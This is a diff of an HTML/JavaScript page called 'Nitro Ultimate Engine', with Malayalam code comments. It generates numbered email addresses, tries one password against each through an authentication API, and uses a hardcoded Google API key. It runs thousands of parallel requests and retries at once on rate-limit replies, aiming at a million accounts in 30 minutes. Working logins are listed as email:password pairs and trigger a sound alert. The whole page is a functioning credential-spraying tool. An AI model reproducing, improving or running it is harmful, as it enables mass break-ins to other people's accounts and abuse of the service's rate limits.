@@ -1,44 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>30-MIN NITRO SEQUENTIAL</title>
+    <title>NITRO ULTIMATE V13</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #ff0; font-family: 'Arial', sans-serif; padding: 10px; text-align: center; }
-        .nitro-box { max-width: 550px; margin: auto; border: 3px solid #ff0; background: #0a0a0a; padding: 20px; box-shadow: 0 0 50px rgba(255, 255, 0, 0.3); border-radius: 10px; }
-        h1 { font-size: 22px; color: #fff; text-transform: uppercase; margin-bottom: 5px; }
-        .sub { font-size: 10px; color: #ff0; margin-bottom: 20px; letter-spacing: 2px; }
+        body { background: #000; color: #ff0055; font-family: 'Arial', sans-serif; text-align: center; padding: 10px; }
+        .main { max-width: 550px; margin: auto; border: 3px solid #ff0055; background: #050505; padding: 20px; box-shadow: 0 0 50px #ff0055; border-radius: 10px; }
+        h1 { font-size: 20px; color: #fff; margin: 0; text-shadow: 0 0 10px #ff0055; }
         
-        input { width: 100%; padding: 15px; margin: 5px 0; background: #111; border: 1px solid #ff0; color: #fff; font-size: 16px; text-align: center; outline: none; }
-        .launch-btn { width: 100%; padding: 22px; background: #ff0; color: #000; border: none; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 20px #ff0; }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #111; border: 1px solid #ff0055; color: #fff; font-size: 16px; text-align: center; outline: none; }
+        .btn-launch { width: 100%; padding: 22px; background: #ff0055; color: #fff; border: none; font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 20px #ff0055; }
         
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .stat { background: #1a1a1a; padding: 15px; border: 1px solid #333; }
-        .stat b { font-size: 32px; color: #fff; display: block; }
+        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
+        .stat { background: #1a1a1a; padding: 12px; border: 1px solid #333; }
+        .stat b { font-size: 35px; color: #fff; display: block; }
 
-        #speed-tag { font-size: 14px; color: #0f0; font-weight: bold; padding: 10px; background: #002200; border-radius: 5px; margin-bottom: 10px; }
-        #res-box { width: 100%; height: 350px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 13px; margin-top: 10px; }
+        #speed-box { font-size: 14px; color: #00ffcc; font-weight: bold; background: #001a1a; padding: 10px; border-radius: 5px; margin-bottom: 10px; border: 1px solid #00ffcc; }
+        #res-box { width: 100%; height: 350px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 13px; margin-top: 10px; white-space: pre; }
     </style>
 </head>
 <body>
 
-<div class="nitro-box">
-    <h1>NITRO SEQUENTIAL V12</h1>
-    <div class="sub">TARGET: 1,000,000 ACCS / 30 MINS</div>
+<div class="main">
+    <h1>🚀 NITRO ULTIMATE ENGINE</h1>
+    <p style="color:#aaa; font-size:10px;">100% SEQUENTIAL | 30 MINS TARGET</p>
     
-    <div id="speed-tag">ENGINE STATUS: STANDBY</div>
+    <div id="speed-box">SPEED: 0 REQ/SEC</div>
     
     <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
     <input type="text" id="pwd" placeholder="PASSWORD">
     
-    <button class="launch-btn" id="btn" onclick="igniteNitro()">🔥 LAUNCH NITRO DRIVE</button>
+    <button class="btn-launch" id="btn" onclick="startEngine()">⚡ ACTIVATE NITRO DRIVE</button>
 
-    <div class="grid">
+    <div class="monitor">
         <div class="stat">CHECKED<b id="c">0</b></div>
         <div class="stat">FOUND<b id="f">0</b></div>
     </div>
 
-    <textarea id="res-box" readonly placeholder="Ordered List..."></textarea>
+    <textarea id="res-box" readonly placeholder="Ordered Results..."></textarea>
 </div>
 
 <script>
@@ -47,11 +46,15 @@
     let found = 0;
     let index = 0;
     let nextToPrint = 0;
-    let nitroBuffer = new Map();
+    let buffer = new Map();
     let startTime;
+    
+    // Found അക്കൗണ്ട് വന്നാൽ ശബ്ദം കേൾക്കാൻ
+    const alertSound = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');
 
-    async function igniteNitro() {
+    async function startEngine() {
         if (active) { location.reload(); return; }
+        
         let fmt = document.getElementById('fmt').value.toUpperCase().trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
@@ -60,22 +63,21 @@
 
         active = true;
         startTime = Date.now();
-        document.getElementById('btn').innerText = "🛑 EMERGENCY ABORT";
-        document.getElementById('btn').style.background = "#f00";
-        document.getElementById('btn').style.color = "#fff";
+        document.getElementById('btn').innerText = "🛑 FORCE STOP";
+        document.getElementById('btn').style.background = "#fff";
+        document.getElementById('btn').style.color = "#000";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- EXTREME OVERCLOCK: 2500 PARALLEL PIPES ---
-        // 30 മിനിറ്റിൽ 10 ലക്ഷം തീർക്കാൻ 2500+ പാരലൽ വർക്കേഴ്സ് ആവശ്യമാണ്.
-        const workers = 2500; 
+        // --- HYPER THREADING: 3000 PARALLEL PIPES ---
+        const workers = 3000; 
 
         for (let i = 0; i < workers; i++) {
-            (async function nitroStream() {
+            (async function stream() {
                 while (active && index < max) {
                     let cur = index++;
-                    await process(fmt, pwd, key, cur, digits);
+                    await fire(fmt, pwd, key, cur, digits);
                 }
             })();
         }
@@ -84,13 +86,11 @@
             if (!active) return;
             let elapsed = (Date.now() - startTime) / 1000;
             let speed = Math.round(checked / elapsed);
-            document.getElementById('speed-tag').innerText = `CURRENT SPEED: ${speed} REQ/SEC`;
-            if (speed < 400) document.getElementById('speed-tag').style.color = "#f00";
-            else document.getElementById('speed-tag').style.color = "#0f0";
+            document.getElementById('speed-box').innerText = `SPEED: ${speed} REQ/SEC`;
         }, 1000);
     }
 
-    async function process(fmt, pwd, key, idx, digits) {
+    async function fire(fmt, pwd, key, idx, digits) {
         let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
         
         try {
@@ -100,20 +100,17 @@
                 headers: { 'Content-Type': 'application/json' }
             });
             
-            if (r.status === 429) {
-                // Rate limit വന്നാൽ ഒരു മില്ലിസെക്കൻഡ് പോലും കളയാതെ റിട്രൈ
-                return process(fmt, pwd, key, idx, digits); 
-            }
+            if (r.status === 429) return fire(fmt, pwd, key, idx, digits); 
 
             let d = await r.json();
-            nitroBuffer.set(idx, { ok: (d && d.idToken), mail: email });
+            buffer.set(idx, { ok: (d && d.idToken), mail: email });
 
-            // --- ZERO-LATENCY SEQUENTIAL FLUSH ---
-            // ബഫറിൽ നിന്ന് 1,2,3 ഓർഡറിൽ മിന്നൽ വേഗത്തിൽ പുഷ് ചെയ്യുന്നു
-            while (nitroBuffer.has(nextToPrint)) {
-                let data = nitroBuffer.get(nextToPrint);
+            // --- ATOMIC SEQUENTIAL FLUSH ---
+            while (buffer.has(nextToPrint)) {
+                let data = buffer.get(nextToPrint);
                 if (data.ok) {
                     found++;
+                    alertSound.play(); // FOUND ALERT!
                     document.getElementById('f').innerText = found;
                     document.getElementById('res-box').value += data.mail + ":" + pwd + "\n";
                     document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
@@ -121,12 +118,12 @@
                 checked++;
                 if (checked % 10 === 0) document.getElementById('c').innerText = checked;
                 
-                nitroBuffer.delete(nextToPrint);
+                buffer.delete(nextToPrint);
                 nextToPrint++;
             }
 
         } catch (e) {
-            return process(fmt, pwd, key, idx, digits); // Network failure retry
+            return fire(fmt, pwd, key, idx, digits); 
         }
     }
 </script>
